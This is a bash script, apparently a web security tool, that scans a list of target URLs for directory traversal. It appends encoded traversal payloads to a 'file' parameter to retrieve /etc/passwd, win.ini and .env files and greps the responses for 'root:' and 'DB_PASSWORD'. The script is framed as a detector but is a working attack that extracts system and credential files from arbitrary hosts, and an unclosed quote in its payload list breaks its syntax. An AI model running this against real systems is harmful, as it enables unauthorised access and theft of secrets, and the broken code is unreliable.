#!/bin/bash

# Directory Traversal Vulnerability Detector - Un1nv1t3dr34p3r
# Detects traversal patterns in URLs, headers, and request bodies

echo "[*] Starting Directory Traversal scan..."

INPUT_FILE="targets.txt"
PAYLOADS=("../" "..%2f" "..%252f" "..%c0%af" "..\")
OUTPUT_CSV="output/traversal_results.csv"
OUTPUT_HTML="output/traversal_results.html"
OUTPUT_JSON="output/traversal_results.json"
SMART_FILES=("/etc/passwd" "windows/win.ini" ".env")

mkdir -p output

echo "Target,Vector,Response" > "$OUTPUT_CSV"
echo "[" > "$OUTPUT_JSON"

scan_target() {
  local url=$1
  for p in "${PAYLOADS[@]}"; do
    for file in "${SMART_FILES[@]}"; do
      full_url="${url}?file=${p}${file}"
      echo "[+] Testing $full_url"
      res=$(curl -s "$full_url")
      if echo "$res" | grep -E "root:|boot.ini|DB_PASSWORD"; then
        echo "$url,$p,Suspicious" >> "$OUTPUT_CSV"
        echo "{\"target\": \"$url\", \"payload\": \"$p\", \"sensitive\": true}," >> "$OUTPUT_JSON"
      fi
    done
  done
}

while IFS= read -r target; do
  scan_target "$target"
done < "$INPUT_FILE"

echo "{}]" >> "$OUTPUT_JSON"
echo "[*] Scan completed. Results in output/"

# Integration with Auto-PoC (if available)
[[ -f ./ai_poc_generator.sh ]] && bash ./ai_poc_generator.sh "$OUTPUT_CSV"

# Risk classification (if available)
[[ -f ./ai_risk_prioritizer.sh ]] && bash ./ai_risk_prioritizer.sh "$OUTPUT_CSV"
